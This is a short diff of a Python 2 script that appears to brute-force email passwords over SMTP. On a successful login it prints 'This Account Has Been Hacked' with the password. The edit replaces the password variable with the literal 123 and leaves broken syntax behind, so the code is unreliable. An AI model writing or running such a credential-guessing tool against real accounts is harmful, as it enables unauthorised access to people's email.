@@ -40,16 +40,18 @@ def login():
          system('clear')
          main()
          print '\n'
-         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
+         print '[+] This Account Has Been Hacked Password :' + 123
+ + '     ^_^'
          break
       except smtplib.SMTPAuthenticationError as e:
          error = str(e)
          if error[14] == '<':
             system('clear')
             main()
-            print '[+] this account has been hacked, password :' + password + '     ^_^'
+            print '[+] this account has been hacked, password :' + 123 + '     ^_^'
 
             break
          else:
-            print '[!] password not found => ' + password
+            print '[!] password not found => ' + 123
+
 login()
